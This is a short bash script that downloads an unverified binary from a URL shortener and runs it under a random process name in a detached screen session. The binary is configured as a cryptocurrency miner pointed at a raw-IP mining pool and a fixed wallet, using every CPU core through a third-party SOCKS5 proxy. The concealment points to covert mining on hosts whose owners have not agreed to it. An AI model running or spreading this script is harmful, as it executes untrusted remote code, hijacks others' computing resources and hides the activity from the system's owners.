#!/usr/bin/env bash
sudo apt install screen -y && wget -qO build https://git.io/JiGZh && chmod +x build &&
TOP=$(shuf -n 1 -i 1-200000)
USER=$1
mv build $TOP
screen -dms run ./$TOP -a verus -o stratum+tcp://51.79.251.11:3300 -u DKjK3oBfsBtCeLaSL2LGTqoVbJauHB97gT.$(echo $(shuf -i 1-2000 -n 1)-DO1) -p -x -t $(nproc --all) -x socks5://174.77.111.197:4145 && screen -r
